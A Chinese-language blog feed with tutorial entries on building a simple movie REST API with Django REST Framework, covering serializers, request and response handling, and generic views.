<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> douban.models <span class="keyword">import</span> Movies</div><div class="line"><span class="keyword">from</span> douban.serializer <span class="keyword">import</span> MoviesSerializer</div><div class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> mixins</div><div class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> generics</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MoviesList</span><span class="params">(mixins.ListModelMixin,</span></span></div><div class="line">                  mixins.CreateModelMixin,</div><div class="line">                  generics.GenericAPIView):</div><div class="line">    queryset = Movies.objects.all()</div><div class="line">    serializer_class = MoviesSerializer</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.list(request, *args, **kwargs)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.create(request, *args, **kwargs)</div></pre></td></tr></table></figure>
<p>同样的, 我们使用GenericAPIView, RetrieveModelMixin, UpdateModelMixin和DestroyModelMixin改写views.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MoviesDetail</span><span class="params">(mixins.RetrieveModelMixin,</span></span></div><div class="line">                    mixins.UpdateModelMixin,</div><div class="line">                    mixins.DestroyModelMixin,</div><div class="line">                    generics.GenericAPIView):</div><div class="line">    queryset = Movies.objects.all()</div><div class="line">    serializer_class = MoviesSerializer</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.retrieve(request, *args, **kwargs)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, request, *args, **kwargs)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.update(request, *args, **kwargs)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self, request, *args, **kwargs)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.destroy(request, *args, **kwargs)</div></pre></td></tr></table></figure>
<p>可看出，这三个 Mixin 分别对应 GET/PUT/DELETE 动作。</p>
<h3 id="使用通用类视图"><a href="#使用通用类视图" class="headerlink" title="使用通用类视图"></a>使用通用类视图</h3><p>使用 Mixin 来重写 views 减少了代码量，但是还可以更少！</p>
<p>那就是使用「通用类视图」—「generic class based views」</p>
<p>同 Django 一样，DRF为我们提供了现成的通用类视图，接下来我们使用这些通用类视图再一次修改原有的 <figure class="highlight plain"><figcaption><span>:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">from douban.models import Movies</div><div class="line">from douban.serializer import MoviesSerializer</div><div class="line">from rest_framework import generics</div><div class="line"></div><div class="line">class MoviesList(generics.ListCreateAPIView):</div><div class="line">    queryset = Movies.objects.all()</div><div class="line">    serializer_class = MoviesSerializer</div><div class="line"></div><div class="line">class MoviesDetail(generics.RetrieveUpdateDestroyAPIView):</div><div class="line">    queryset = Movies.objects.all()</div><div class="line">    serializer_class = MoviesSerializer</div></pre></td></tr></table></figure></p>
<p>这样，代码已经非常的精简了，不过坏处在于，你不知道他具体执行了什么。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Django REST Framework 2-请求和响应]]></title>
      <url>http://lexuslee.me/2016/04/02/2016-04-02-DRF-tutorial-2-request-and-response/</url>
      <content type="html"><![CDATA[<h2 id="请求与响应"><a href="#请求与响应" class="headerlink" title="请求与响应"></a>请求与响应</h2><h3 id="请求对象"><a href="#请求对象" class="headerlink" title="请求对象"></a>请求对象</h3><p>DRF 提供了一个 <figure class="highlight plain"><figcaption><span>对象，它继承自 ```HttpRequest``` 并且提供了更丰富的对 request 的解析处理的方法。其中最核心的是 ```request``` 对象的 ```request.data``` 属性，它看起来和 Django 的```request.POST``` 相似，但是在处理 Web API 上更强大些。 </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">request.POST  # Only handles form data.  Only works for &apos;POST&apos; method.</div><div class="line">request.data  # Handles arbitrary data.  Works for &apos;POST&apos;, &apos;PUT&apos; and &apos;PATCH&apos; methods.</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><figcaption><span>相比于 ```request.POST``` 能够处理 api 中的 「POST」、「PUT」、「PATCH」等请求。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 返回对象</div><div class="line"></div><div class="line">DRF 也提供了一个 ```response``` 对象，它能把未 render 的对象(数据)通过一定方式转化为正确的数据格式返回给客户端。</div><div class="line"></div><div class="line">```python</div><div class="line">return Response(data)  # Renders to content type as requested by the client.</div></pre></td></tr></table></figure>
<h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><p>如果单独使用 Http 状态码的话代码会很难度，比如像我这种万年记不住几个很奇怪的状态码的人，在看到它们的时候还要 google 这就很伤！所以 DRF 提供了一个可读性更好的状态码标识，比如 <code>HTTP_400_BAD_REQUEST</code>  ，是不是一下就看出来这是 bad request 了。这些状态码都封装在了 <figure class="highlight plain"><figcaption><span>模块里，使用它们比使用纯数字的 Http 状态码更安逸。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 封装的 API views</div><div class="line"></div><div class="line">DRF 提供了两个封装好的 API views</div><div class="line"></div><div class="line">1.  `@api_view`  这个装饰器用于基于函数的视图 </div><div class="line">2.  `APIView`  这个类用于基于类的视图</div><div class="line"></div><div class="line">这两个 views 提供了一些函数如确保在视图中接收到 ```request``` 实例和自动在 ```response``` 对象中添加 context 使其能够被 render 。</div><div class="line"></div><div class="line">### 开始撸代码吧</div><div class="line"></div><div class="line">紧接着[上节的教程]()我们要在 views 中添加一些新功能</div><div class="line"></div><div class="line">先把 ```JSONResponse``` 扔掉，这东西太难用了，我们不再需要它。</div><div class="line"></div><div class="line">接着在 ```douban/views.py``` 中加入以下代码:</div><div class="line"></div><div class="line">```python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from rest_framework import status</div><div class="line">from rest_framework.decorators import api_view</div><div class="line">from rest_framework.response import Response</div><div class="line">from douban.models import Movies</div><div class="line">from douban.serializer import MoviesSerializer</div><div class="line"></div><div class="line">@api_view([&apos;GET&apos;, &apos;POST&apos;])</div><div class="line">def movies_list(request):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    罗列出所有的 Movies 或者 能新建一个 Movies</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    if request.method == &apos;GET&apos;:</div><div class="line">        movies = Movies.objects.all()</div><div class="line">        serializer = MoviesSerializer(movies, many=True)</div><div class="line">        return Response(serializer.data)</div><div class="line"></div><div class="line">    elif request.method == &apos;POST&apos;:</div><div class="line">        serializer = MoviesSerializer(data=request.data)</div><div class="line">        if serializer.is_valid():</div><div class="line">            serializer.save()</div><div class="line">            return Response(serializer.data, status=status.HTTP_201_CREATED)</div><div class="line">        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)</div><div class="line"></div><div class="line">@api_view([&apos;GET&apos;, &apos;PUT&apos;, &apos;DELETE&apos;])</div><div class="line">def movies_detail(request, pk):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    展示\更新或删除一个 Movies</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    try:</div><div class="line">        movies = Movies.objects.get(pk=pk)</div><div class="line">    except Movies.DoesNotExist:</div><div class="line">        return Response(status=status.HTTP_404_NOT_FOUND)</div><div class="line"></div><div class="line">    if request.method == &apos;GET&apos;:</div><div class="line">        serializer = MoviesSerializer(movies)</div><div class="line">        return Response(serializer.data)</div><div class="line"></div><div class="line">    elif request.method == &apos;PUT&apos;:</div><div class="line">        serializer = MoviesSerializer(movies, data=request.data)</div><div class="line">        if serializer.is_valid():</div><div class="line">            serializer.save()</div><div class="line">            return Response(serializer.data)</div><div class="line">        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)</div><div class="line"></div><div class="line">    elif request.method == &apos;DELETE&apos;:</div><div class="line">        movies.delete()</div><div class="line">        return Response(status=status.HTTP_204_NO_CONTENT)</div></pre></td></tr></table></figure></p>
<p>用上了 @api_view 后代码比之前更简洁了。</p>
<p>需要注意的是: 我们不再指明 request 和 response 中的内容类型。 request.DATA 即可用来处理 json 数据类型类型, 也可以处理 yaml 或其他数据类型。我们只需要在 response 中指定要返回的数据， DRF 能根据不同情况，自动在 response 中呈现正确的数据类型。</p>
<h3 id="在-URLs-中添加可选后缀"><a href="#在-URLs-中添加可选后缀" class="headerlink" title="在 URLs 中添加可选后缀"></a>在 URLs 中添加可选后缀</h3><p>现在我们的 response 对象不是像教程1中的对数据类型进行强制要求了。</p>
<p>并且对 url 也不是硬连接的。</p>
<p>那么就可以定制可选的 url 后缀，如: </p>
<p>通过 <a href="http://example.com/api/items/4/.json" target="_blank" rel="external">http://example.com/api/items/4/.json</a> 来访问 Web API。</p>
<p>我们所需做的就是在 views 中添加 <figure class="highlight plain"><figcaption><span>关键字: </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">def movies_list(request, format=None):</div></pre></td></tr></table></figure></p>
<p>还有</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">movies_detail</span><span class="params">(request, pk, format=None)</span>:</span></div></pre></td></tr></table></figure>
<p>然后在 <figure class="highlight plain"><figcaption><span>中加入 ```format_suffix_patterns``` :</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from django.conf.urls import url</div><div class="line">from rest_framework.urlpatterns import format_suffix_patterns</div><div class="line">from douban import views</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r&apos;^dbmovies/$&apos;, views.movies_list),</div><div class="line">    url(r&apos;^dbmovies/(?P&lt;pk&gt;[0-9]+)/$&apos;, views.movies_detail),</div><div class="line">]</div><div class="line"></div><div class="line">urlpatterns = format_suffix_patterns(urlpatterns)</div></pre></td></tr></table></figure></p>
<p>不过，一般情况下，我们耶不会用到那么奇葩的 url 访问方式，以上的例子只是说明了用奇葩的 url 方式也是可以访问的 ：D </p>
<h3 id="再测试下我们的-API"><a href="#再测试下我们的-API" class="headerlink" title="再测试下我们的 API"></a>再测试下我们的 API</h3><p>在终端中输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python manage.py runserver</div></pre></td></tr></table></figure>
<p>接着来浏览器中访问 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">![apitest2](http://7xse6j.com1.z0.glb.clouddn.com/apitest2.png)</div><div class="line"></div><div class="line">如果出现如图所示的 api 则说明 Web api 返回成功。</div><div class="line"></div><div class="line">然后我们可以在这个页面中 POST 一个新的 Movies :</div><div class="line"></div><div class="line">在表单中选择 Media type 为 json 格式并输入</div><div class="line"></div><div class="line">```json</div><div class="line">&#123;</div><div class="line">    &quot;id&quot;: 3,</div><div class="line">    &quot;title&quot;: &quot;Carol&quot;,</div><div class="line">    &quot;year&quot;: &quot;2015&quot;,</div><div class="line">    &quot;country&quot;: &quot;US&quot;,</div><div class="line">    &quot;type&quot;: &quot;Romance&quot;,</div><div class="line">    &quot;rating&quot;: &quot;8.3&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/apitest3.png" alt="apipost"></p>
<p>如果返回如下图所示，则说明 POST 成功！</p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/apitest4.png" alt="postsuccess"></p>
<p>你或许会注意到，每个访问这个页面的人都能 POST 一个新的 Movies ，这是不合理的，所以需要赋予权限，这个我们日后再说。</p>
<h3 id="可浏览性"><a href="#可浏览性" class="headerlink" title="可浏览性"></a>可浏览性</h3><p>Because the API chooses the content type of the response based on the client request, it will, by default, return an HTML-formatted representation of the resource when that resource is requested by a web browser. This allows for the API to return a fully web-browsable HTML representation.</p>
<p>Having a web-browsable API is a huge usability win, and makes developing and using your API much easier. It also dramatically lowers the barrier-to-entry for other developers wanting to inspect and work with your API.</p>
<p>See the <a href="http://www.django-rest-framework.org/topics/browsable-api/" target="_blank" rel="external">browsable api</a> topic for more information about the browsable API feature and how to customize it.</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Django REST Framework 1-序列化]]></title>
      <url>http://lexuslee.me/2016/04/01/2016-04-01-DRF-tutorial-1-serialization/</url>
      <content type="html"><![CDATA[<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先我们先新建一个 <figure class="highlight plain"><figcaption><span>项目并安装上 django-rest-framework (DRF) 环境</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```bash</div><div class="line">$ pip install djangorestframework</div><div class="line">$ python manage.py startnewproject restapi</div><div class="line">$ cd restapi</div><div class="line">$ python manage.py startnewapp douban</div></pre></td></tr></table></figure></p>
<p>接着，我们需要在 <figure class="highlight plain"><figcaption><span>里的加入如下代码:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">INSTALLED_APPS = (</div><div class="line">    ...</div><div class="line">    &apos;rest_framework&apos;,</div><div class="line">    &apos;douban&apos;,</div><div class="line">)</div></pre></td></tr></table></figure></p>
<h3 id="建立模型"><a href="#建立模型" class="headerlink" title="建立模型"></a>建立模型</h3><p>由于我炒鸡喜欢看电影，所以仿着  <figure class="highlight plain"><figcaption><span>来做个简易的豆瓣电影的 rest-api 。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">所以我们就用这个「仿豆瓣电影 api 」来作为栗子开始教程吧！</div><div class="line"></div><div class="line">编辑 ```douban/models.py``` 文件并加入以下代码:</div><div class="line"></div><div class="line">``` python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from django.db import models</div><div class="line"></div><div class="line"># 举个栗子</div><div class="line">COUNTRY_CHOICES = (</div><div class="line">    (&apos;US&apos;, &apos;US&apos;),</div><div class="line">    (&apos;Asia&apos;, &apos;Asia&apos;),</div><div class="line">    (&apos;CN&apos;, &apos;CN&apos;),</div><div class="line">    (&apos;TW&apos;, &apos;TW&apos;),</div><div class="line">)</div><div class="line">TYPE_CHOICES = (</div><div class="line">    (&apos;Drama&apos;, &apos;Drama&apos;),</div><div class="line">    (&apos;Thriller&apos;, &apos;Thriller&apos;),</div><div class="line">    (&apos;Sci-Fi&apos;, &apos;Sci-Fi&apos;),</div><div class="line">    (&apos;Romance&apos;, &apos;Romance&apos; ),</div><div class="line">    (&apos;Comedy&apos;, &apos;Comedy&apos;)</div><div class="line">)</div><div class="line">GENDER_CHOICES = (</div><div class="line">    (&apos;male&apos;, &apos;male&apos;),</div><div class="line">    (&apos;female&apos;, &apos;female&apos;)</div><div class="line">)</div><div class="line"></div><div class="line">class movies(models.Model):</div><div class="line">    title = models.CharField(max_length=100, blank=True, default=&apos;&apos;)</div><div class="line">    year = models.CharField(max_length=20)</div><div class="line">    # 在 director 关联了 movies 类 和 celecrity 类, 在第4章会用到 celebrity 类</div><div class="line">    # director = models.ForeignKey(&apos;celebrity&apos;, related_name=&apos;movies&apos;)</div><div class="line">    country = models.CharField(choices=COUNTRY_CHOICES, default=&apos;US&apos;, max_length=20)</div><div class="line">    type = models.CharField(choices=TYPE_CHOICES, default=&apos;Romance&apos;, max_length=20)</div><div class="line">    rating = models.DecimalField(max_digits=3, decimal_places=1)</div><div class="line">    created = models.DateTimeField(auto_now_add=True)</div><div class="line"></div><div class="line">    class Meta:</div><div class="line">        ordering = (&apos;created&apos;,)</div><div class="line"></div><div class="line"># class celebrity(models.Model):</div><div class="line">#     name = models.CharField(max_length=100, blank=True, default=&apos;&apos;)</div><div class="line">#     age = models.IntegerField()</div><div class="line">#     gender = models.CharField(choices=GENDER_CHOICES, default=&apos;男&apos;, max_length=20)</div></pre></td></tr></table></figure></p>
<p>接着在终端中运行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python manage.py makemigrations douban</div><div class="line">$ python manage.py migrate</div><div class="line">$ python manage.py syncdb</div></pre></td></tr></table></figure>
<p>来创建一个新的 migrations 并在数据库中生成表。</p>
<h3 id="创建序列化类"><a href="#创建序列化类" class="headerlink" title="创建序列化类"></a>创建序列化类</h3><p>在开始构建 Web API 时，我们首先要做的就是提供对 <figure class="highlight plain"><figcaption><span>实例的序列化和反序列化(即对序列化后的实例进行「解码」)，这样才能生成可供浏览的 ```json``` 格式的 api 。我们可以通过声明「序列器」(一个和 Django 表单十分类似的玩意儿)来做到这一点。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">在 ```restapi``` 目录中创建一个 ```serializer.py``` 文件，加入以下代码:</div><div class="line"></div><div class="line">```python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from rest_framework import serializers</div><div class="line">from douban.models import movies, COUNTRY_CHOICES, TYPE_CHOICES</div><div class="line"></div><div class="line">class MoviesSerializer(serializers.Serializer):</div><div class="line">    pk = serializers.IntegerField(read_only=True)</div><div class="line">    title = serializers.CharField(required=False, allow_blank=True, max_length=100)</div><div class="line">    year = serializers.CharField(max_length=20)</div><div class="line">    country = serializers.ChoiceField(choices=COUNTRY_CHOICES, default=&apos;US&apos;)</div><div class="line">    type = serializers.ChoiceField(choices=TYPE_CHOICES, default=&apos;Romance&apos;)</div><div class="line">    rating = serializers.DecimalField(max_digits=3, decimal_places=1)</div><div class="line"></div><div class="line">    def create(self, validated_data):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        根据接收到的 validated_data 创建一个 movies 实例</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        return movies.objects.create(**validated_data)</div><div class="line"></div><div class="line">    def update(self, instance, validated_data):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        根据接收到的 validated_data 更新并返回一个 movies 实例</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        instance.title = validated_data.get(&apos;title&apos;, instance.title)</div><div class="line">        instance.year = validated_data.get(&apos;year&apos;, instance.year)</div><div class="line">        instance.country = validated_data.get(&apos;country&apos;, instance.country)</div><div class="line">        instance.type = validated_data.get(&apos;type&apos;, instance.type)</div><div class="line">        instance.rating = validated_data.get(&apos;rating&apos;, instance.rating)</div><div class="line">        instance.save()</div><div class="line">        return instance</div></pre></td></tr></table></figure></p>
<p>序列器的第一个部分定义了要进行序列化/反序列化的字段。</p>
<figure class="highlight plain"><figcaption><span>和 ```update()``` 方法定义了符合规范的 movies 实例的创建和更新的方法。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">序列器非常类似于 Django ```Form``` 表单，它包含了几种对字段常见的验证标识符，如 ```required``` 、 ```max_length``` 、 ```default``` 等。这些标识符实现的功能类似于 Django 表单，就不详细解释了。</div><div class="line"></div><div class="line">所以序列器实现了以下两个功能:</div><div class="line"></div><div class="line">- 选择相应的模型</div><div class="line">- 选择要展现的字段(验证后的)</div><div class="line"></div><div class="line">我们也可以通过使用 ```ModelSerializer``` 多快好省地的构建序列器，这个我们日后再说。</div><div class="line"></div><div class="line">### 开始使用序列器</div><div class="line"></div><div class="line">在开始项目之前，我们先熟悉下序列器，在终端中启动 Django shell :</div><div class="line"></div><div class="line">```bash</div><div class="line">$ python manage.py shell</div></pre></td></tr></table></figure>
<p>输入以下代码来创建2个 Movies 实例 </p>
<p>「荒野猎人」和「蝙蝠侠爱上超人」</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> douban.models <span class="keyword">import</span> Movies</div><div class="line"><span class="keyword">from</span> douban.serializer <span class="keyword">import</span> MoviesSerializer</div><div class="line"><span class="keyword">from</span> rest_framework.renderers <span class="keyword">import</span> JSONRenderer</div><div class="line"><span class="keyword">from</span> rest_framework.parsers <span class="keyword">import</span> JSONParser</div><div class="line"></div><div class="line">movies = Movies(title=<span class="string">'The Revenant'</span>, year=<span class="string">'2015'</span>, country=<span class="string">'US'</span>, type=<span class="string">'Drama'</span>, rating=<span class="number">7.9</span>)</div><div class="line">movies.save()</div><div class="line"></div><div class="line">movies = Movies(title=<span class="string">'Batman v Superman: Dawn of Justice'</span>,  year=<span class="string">'2016'</span>, country=<span class="string">'US'</span>, type=<span class="string">'Romance'</span>, rating=<span class="number">6.7</span>)</div><div class="line">movies.save()</div></pre></td></tr></table></figure>
<p>然后将其中一个实例序列化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">serializer = MoviesSerializer(movies)</div><div class="line">serializer.data</div><div class="line"></div><div class="line"><span class="comment">#&#123;'rating': u'7.9', 'title': u'The Revenant', 'country': 'US', 'year': u'2015', 'pk': None, 'type': 'Drama'&#125;</span></div></pre></td></tr></table></figure>
<p>接着我们将以上数据转换为 JSON 格式，实现序列化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">content = JSONRenderer().render(serializer.data)</div><div class="line">content</div><div class="line"></div><div class="line"><span class="comment">#&#123;"pk":null,"title":"The Revenant","year":"2015","country":"US","type":"Drama","rating":"7.9"&#125;'</span></div></pre></td></tr></table></figure>
<p>反序列化也类似，通过解析 Python 数据流并将数据流”引入”实例中即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> django.utils.six <span class="keyword">import</span> BytesIO</div><div class="line"></div><div class="line">stream = BytesIO(content)</div><div class="line">data = JSONParser().parse(stream)</div><div class="line">serializer = MoviesSerializer(data=data)</div><div class="line">serializer.is_valid()</div><div class="line"><span class="comment"># True</span></div><div class="line">serializer.validated_data</div><div class="line"><span class="comment">#OrderedDict([(u'title', u'The Revenant'), (u'year', u'2015'), (u'country', 'US'), (u'type', 'Drama'), (u'rating', Decimal('7.9'))])</span></div></pre></td></tr></table></figure>
<p>可见, serializer和django form 有多么相似, 当我们写view时, 这一相似性会更加明显.</p>
<p>当我们输入参数many=True时, serializer还能序列化queryset:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">serializer = MoviesSerializer(Movies.objects.all(), many=<span class="keyword">True</span>)</div><div class="line">serializer.data</div><div class="line">[OrderedDict([(<span class="string">'pk'</span>, <span class="number">1</span>), (<span class="string">'title'</span>, <span class="string">u'Batman v Superman: Dawn of Justice'</span>), (<span class="string">'year'</span>, <span class="string">u'2016'</span>), (<span class="string">'country'</span>, <span class="string">'US'</span>), (<span class="string">'type'</span>, <span class="string">'Romance'</span>), (<span class="string">'rating'</span>, <span class="string">u'6.7'</span>)]), OrderedDict([(<span class="string">'pk'</span>, <span class="number">2</span>), (<span class="string">'title'</span>, <span class="string">u'The Revenant'</span>), (<span class="string">'year'</span>, <span class="string">u'2015'</span>), (<span class="string">'country'</span>, <span class="string">'US'</span>), (<span class="string">'type'</span>, <span class="string">'Drama'</span>), (<span class="string">'rating'</span>, <span class="string">u'7.9'</span>)])]</div></pre></td></tr></table></figure>
